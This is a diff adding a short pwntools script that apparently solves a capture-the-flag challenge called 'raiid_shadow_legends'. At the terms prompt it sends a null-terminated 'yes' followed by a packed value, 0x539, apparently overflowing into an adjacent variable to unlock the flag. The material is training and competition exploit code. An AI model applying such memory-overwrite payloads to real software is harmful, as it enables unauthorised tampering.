@@ -1,0 +1,18 @@
+#!/usr/bin/env python3
+from pwn import *
+p = process('./raiid_shadow_legends')
+p.recvuntil('What would you like to do?')
+p.sendline('1')
+p.recvuntil('Do you agree to the terms and conditions?')
+p.sendline(b'yes\0' + p32(0x539))
+p.recvuntil('Do you agree to the terms and conditions?')
+p.sendline('yes')
+p.recvuntil('Sign here:')
+p.sendline('foo')
+p.recvuntil('Enter your name:')
+p.sendline('foo')
+p.recvuntil('What would you like to do?')
+p.sendline('2')
+p.recvuntil("It's a tough battle, but you emerge victorious. The flag has been recovered successfully: ")
+flag = p.recvline()
+print(flag)
